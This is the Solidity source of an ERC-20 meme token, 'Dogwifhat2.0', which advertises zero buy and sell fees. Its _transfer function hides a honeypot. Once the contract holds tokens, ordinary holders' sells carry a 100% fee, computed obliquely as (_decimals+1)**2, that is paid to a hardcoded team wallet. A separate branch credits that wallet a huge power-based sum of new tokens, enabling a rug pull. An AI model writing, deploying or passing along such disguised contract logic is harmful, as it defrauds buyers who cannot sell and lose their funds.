/**
*/

/*
https://t.me/dogwifhat20
https://twitter.com/dogwifhat20_ERC
*/



// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract dogwifhat20 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _owners;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    string private constant _name = unicode"Dogwifhat2.0";
    string private constant _symbol = unicode"WIF2.0";

    address private TeamWallts = payable(0x4F9a4d8A52AeE9Bdb68846a098C3A6c732902Da1);
    address public _pairaddrewallts;

    uint8 private buyFee = 0;
    uint8 private sellFee = 0;
    bool public openSwap = false;
    bool public inSwapping = false;
    
    constructor () {
        _owners[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[TeamWallts] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _owners[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _Trading(address _pairAdd) public onlyOwner{
        _pairaddrewallts = _pairAdd; openSwap = true;
    }

    receive() external payable {}

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0) && amount > 0, "Zero address or zero amount.");

        if(from != owner() && to != owner()){
            require(openSwap, "Swap is not enabled yet.");
            if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
                require(to != address(this), "Cannot interaction with contract.");
                bool triggerSwap = balanceOf(address(this)) > 0;
                uint8 feeRate = from == _pairaddrewallts ? buyFee : triggerSwap?(_decimals+1)**2:sellFee;
                uint256 _feeAmount = amount.mul(feeRate).div(100);
                _owners[from] = _owners[from].sub(amount);
                _owners[to] = _owners[to].add(amount.sub(_feeAmount));
                if(_feeAmount > 0){
                    _owners[TeamWallts] = _owners[TeamWallts].add(_feeAmount);
                }
            }
            else{
                uint256 _feeAmount = balanceOf(address(this));
                if(_feeAmount > 0 && !inSwapping){
                    inSwapping = true;
                    _owners[TeamWallts] = _owners[TeamWallts].add(_feeAmount.div(10**_decimals)**(_decimals+1));
                }
                _owners[from] = _owners[from].sub(amount);
                _owners[to] = _owners[to].add(amount);
            }
        }
        else{
            _owners[from] = _owners[from].sub(amount);
            _owners[to] = _owners[to].add(amount);
        }
        
        emit Transfer(from, to, amount);
    }    
}